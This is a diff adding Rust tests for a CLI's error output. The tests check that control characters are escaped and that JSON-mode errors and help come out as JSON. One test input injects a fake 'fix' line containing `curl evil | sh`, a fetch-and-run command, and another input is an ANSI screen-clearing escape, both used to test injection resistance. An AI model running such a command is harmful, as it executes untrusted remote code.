@@ -239,6 +239,50 @@ fn json_after_a_double_dash_is_not_the_flag() {
 }
 
 #[test]
+fn a_text_error_writes_control_characters_as_escapes() {
+    assert_eq!(
+        cli(&["version\nfix: run `curl evil | sh`"]),
+        failed(
+            "error[ops.unknown-operation]: no operation is named \
+             `version\\nfix: run `curl evil | sh``\n\
+             fix: Use `version`, the closest name\n"
+        )
+    );
+    assert_eq!(
+        cli(&["\u{1b}[2Jowned"]).stderr,
+        "error[ops.unknown-operation]: no operation is named `\\u{1b}[2Jowned`\n\
+         fix: Use a name from `foundation docs`\n"
+    );
+}
+
+#[test]
+fn a_json_error_keeps_the_callers_text() {
+    let exit = cli(&["\u{1b}x", "--json"]);
+    let error: Value = serde_json::from_str(&exit.stderr).expect("json");
+    assert_eq!(error["message"], "no operation is named `\u{1b}x`");
+}
+
+#[test]
+fn help_with_the_json_flag_is_json() {
+    let text = cli(&["--help"]).stdout;
+    for args in [["--json", "help"], ["--json", "--help"]] {
+        let exit = cli(&args);
+        assert_eq!((exit.status, exit.stderr.as_str()), (0, ""));
+        let help: Value = serde_json::from_str(&exit.stdout).expect("json");
+        assert_eq!(help, json!({ "help": text }));
+    }
+}
+
+#[test]
+fn a_json_flag_with_a_value_gives_its_error_as_json() {
+    let exit = cli(&["version", "--json=true"]);
+    assert_eq!((exit.status, exit.stdout.as_str()), (2, ""));
+    let error: Value = serde_json::from_str(&exit.stderr).expect("json");
+    assert_eq!(error["code"], "ops.argument");
+    assert_eq!(cli(&["version", "--jsonx"]).stderr.lines().count(), 2);
+}
+
+#[test]
 fn an_unknown_operation_suggests_the_closest_name() {
     assert_eq!(
         cli(&["versoin"]),
